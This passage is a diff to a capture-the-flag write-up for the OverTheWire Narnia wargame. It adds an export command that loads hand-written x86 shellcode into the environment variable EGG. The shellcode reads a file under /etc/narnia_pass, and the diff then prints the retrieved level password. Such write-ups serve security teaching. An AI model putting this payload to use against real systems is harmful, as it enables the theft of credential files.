@@ -24,6 +24,14 @@ Below shows the necessary shellcode we must store in "EGG":
 
 <img width="969" alt="Screen Shot 2024-01-12 at 11 10 01 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/f64856ee-0bd2-455d-a087-bd1b32375118">
 
+We can then use the following command to store this shellcode in the env variable "EGG":
+$ export EGG=$'j\x01\xfe\x0c$hnia2h/narhpasshnia_h/narh/etc\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'
+Then upon running the program we retreive the password:  
+
+<img width="1185" alt="Screen Shot 2024-01-12 at 11 14 03 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/572cff31-03a5-40c1-a76c-44eca7502053">
+
+Pass: Zzb6MIyceT
+
 
 
 
